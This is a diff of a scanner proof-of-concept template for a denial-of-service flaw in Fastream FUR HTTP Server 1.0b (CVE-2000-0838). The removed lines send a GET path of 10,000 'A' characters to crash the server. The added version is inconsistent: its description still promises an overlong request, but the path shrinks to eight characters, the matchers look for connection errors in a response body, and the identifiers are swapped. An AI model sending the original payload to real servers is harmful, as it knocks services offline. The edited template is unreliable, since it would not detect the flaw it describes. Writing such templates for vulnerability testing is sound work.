@@ -1,10 +1,10 @@
 [info]
 author = "AVE"
-description = "通过发送超长GET请求检测Fastream FUR HTTP Server 1.0b拒绝服务漏洞"
+description = "Fastream FUR HTTP Server 1.0b 超长GET请求拒绝服务漏洞验证。发送超长GET请求导致服务器进程崩溃，验证服务是否受影响。"
 id = "POC-AVE-2000-0965"
-name = "Fastream FUR HTTP Server 1.0b DoS PoC"
+name = "CVE-2000-0838 PoC"
 severity = "medium"
-tags = ["cve-2000-0838"]
+tags = ["ave-2000-0965"]
 vuln_id = [
     "CVE-2000-0838",
     "AVE-2000-0965",
@@ -15,7 +15,7 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = '/{{BaseURL}}/{{repeat("A", 10000)}}'
+path = "/{{BaseURL}}/AAAAAAAA"
 protocol = "http"
 
 [[poc.requests.matchers]]
@@ -23,7 +23,6 @@ expect = true
 part = "body"
 type = "word"
 words = [
-    "Bad Request",
-    "500",
-    "Service Unavailable",
+    "Connection refused",
+    "No route to host",
 ]
